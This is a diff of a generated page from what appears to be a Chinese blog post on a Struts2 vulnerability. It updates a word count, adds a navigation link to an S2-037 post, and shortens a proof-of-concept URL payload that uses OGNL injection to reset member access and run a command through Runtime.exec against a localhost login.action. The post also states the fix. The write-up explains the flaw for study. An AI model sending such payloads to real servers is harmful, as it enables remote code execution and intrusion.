@@ -126,7 +126,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    454 字
+                    446 字
                   </span>
                 
 
@@ -231,7 +231,7 @@
 <pre><code class="java">public static final MemberAccess DEFAULT_MEMBER_ACCESS = new DefaultMemberAccess(false);
 </code></pre>
 <p>payload 如下：</p>
-<pre><code>http://localhost:8080/login.action?method:(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d)).toString&amp;a=xwork.MethodAccessor.denyMethodExecution&amp;b=allowStaticMethodAccess&amp;c=calc
+<pre><code>http://localhost:8080/login.action?method:(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,@java.lang.Runtime@getRuntime().exec(%23parameters.c%5b0%5d)).toString&amp;c=calc
 </code></pre><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>给 method: 前缀的参数值加上了前面 actionName 的过滤。</p>
 <hr>
 <p>参考文章：</p>
@@ -257,6 +257,11 @@
               
                 <div class="post-prevnext row">
                   <div class="post-prev col-12 col-md-6">
+                    
+                      <a href="/2020/07/29/struts2系列漏洞-S2-037/">
+                        <i class="fa fa-chevron-left"></i>
+                        <span>struts2系列漏洞 S2-037</span>
+                      </a>
                     
                   </div>
                   <div class="post-next col-12 col-md-6">
